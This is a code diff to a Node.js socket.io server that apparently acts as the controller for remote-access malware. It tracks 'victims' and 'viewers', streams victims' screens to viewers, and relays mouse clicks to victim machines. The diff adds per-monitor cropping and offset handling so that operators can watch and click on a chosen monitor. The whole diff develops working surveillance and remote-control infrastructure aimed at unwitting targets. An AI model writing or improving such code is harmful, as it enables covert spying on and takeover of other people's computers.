@@ -30,7 +30,7 @@ app.get("/healthz", (req, res) => {
 io.on("connection", (socket) => {
   console.log(`[+] Connection: ${socket.id}`);
 
-  // VICTIM
+  // ── VICTIM ──
   socket.on("register-victim", (data) => {
     const victimId = data.id || socket.id;
     victims.set(victimId, {
@@ -83,16 +83,15 @@ io.on("connection", (socket) => {
     });
   });
 
-  // VIEWER
+  // ── VIEWER ──
   socket.on("register-viewer", () => {
     socket.role = "viewer";
-    viewers.set(socket, { viewing: null });
+    viewers.set(socket, { viewing: null, currentCrop: null });
     console.log(`[VIEWER ONLINE] ${socket.id}`);
     socket.emit("victim-list", getVictimList());
 
     socket.on("select-victim", (data) => {
       const victimId = typeof data === "string" ? data : data.id;
-      const crop = data.crop || null;
       const monitorIndex = data.monitorIndex !== undefined ? data.monitorIndex : null;
 
       const victim = victims.get(victimId);
@@ -116,32 +115,64 @@ io.on("connection", (socket) => {
         }
       }
 
-      // Subscribe
-      viewers.set(socket, { viewing: victimId });
+      // Determine crop info for the victim
+      let cropPayload = null;
+      let displayW = victim.w;
+      let displayH = victim.h;
+      let cropOffsetX = 0;
+      let cropOffsetY = 0;
+
+      if (monitorIndex !== null && monitorIndex !== undefined) {
+        const mons = victim.monitors || [];
+        if (monitorIndex >= 0 && monitorIndex < mons.length) {
+          const mon = mons[monitorIndex];
+          cropPayload = { x: mon.x, y: mon.y, w: mon.w, h: mon.h };
+          displayW = mon.w;
+          displayH = mon.h;
+          cropOffsetX = mon.x;
+          cropOffsetY = mon.y;
+        }
+      }
+
+      // Store current crop info on the viewer entry
+      viewers.set(socket, {
+        viewing: victimId,
+        cropOffsetX,
+        cropOffsetY,
+        displayW,
+        displayH,
+        victimW: victim.w,
+        victimH: victim.h
+      });
+
+      // Subscribe to frame stream
       if (!frameStreams.has(victimId)) {
         frameStreams.set(victimId, new Set());
       }
       frameStreams.get(victimId).add(socket);
 
+      // Tell victim to start/update streaming
       victim.socket.emit("viewer-count", frameStreams.get(victimId).size);
-
-      // Send crop info with monitorIndex for the victim
-      const cropPayload = monitorIndex !== null && monitorIndex !== undefined
-        ? { monitorIndex }
-        : null;
-
       victim.socket.emit("set-crop", cropPayload);
 
+      // Tell viewer what to expect
       socket.emit("victim-info", {
         id: victimId,
-        w: crop ? crop.w : victim.w,
-        h: crop ? crop.h : victim.h,
+        w: victim.w,
+        h: victim.h,
+        displayW: displayW,
+        displayH: displayH,
+        cropOffsetX: cropOffsetX,
+        cropOffsetY: cropOffsetY,
         monitors: victim.monitors,
         crop: cropPayload,
         monitorIndex: monitorIndex
       });
 
-      console.log(`[VIEWING] ${socket.id} -> ${victimId}${monitorIndex !== null ? ` monitor[${monitorIndex}]` : ''}`);
+      console.log(
+        `[VIEWING] ${socket.id} -> ${victimId}` +
+        `${monitorIndex !== null ? ` monitor[${monitorIndex}] (${displayW}x${displayH} @ ${cropOffsetX},${cropOffsetY})` : ' full desktop'}`
+      );
     });
 
     socket.on("click", (data) => {
@@ -149,6 +180,7 @@ io.on("connection", (socket) => {
       if (!viewer || !viewer.viewing) return;
       const victim = victims.get(viewer.viewing);
       if (victim && victim.socket.connected) {
+        // Data already has remoteX/remoteY calculated by viewer with crop offset
         victim.socket.emit("click", { x: data.x, y: data.y, btn: data.btn || "left" });
       }
     });
